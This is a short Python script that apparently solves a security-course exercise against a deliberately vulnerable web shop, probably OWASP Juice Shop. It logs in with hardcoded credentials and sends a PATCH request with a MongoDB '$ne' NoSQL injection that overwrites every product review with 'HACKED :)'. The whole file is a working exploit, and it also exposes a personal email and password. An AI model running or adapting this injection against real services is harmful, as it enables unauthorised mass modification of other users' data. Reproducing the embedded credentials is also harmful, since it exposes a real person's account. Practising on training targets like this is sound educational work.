import json

import requests

s = requests.Session()

r = s.post(
    'http://43.241.202.33:3003/rest/user/login',
    data=json.dumps({
        "email": 'a1644290@student.adelaide.edu.au',
        "password": 'qwerty',
    }),
    headers={'Content-type': 'application/json;charset=utf-8'},
)

print("Login:", r)

s.headers.update({'Authorization': "Bearer " + json.loads(r.text)['authentication']['token']})

# $ne https://docs.mongodb.com/manual/reference/operator/query/ne/

r = s.patch(
    'http://43.241.202.33:3003/rest/product/reviews',
    data=json.dumps({"id": {"$ne": -1}, "message": "HACKED :)"}),
    headers={'Content-type': 'application/json;charset=utf-8'},
)
print("Update:", r, r.text)
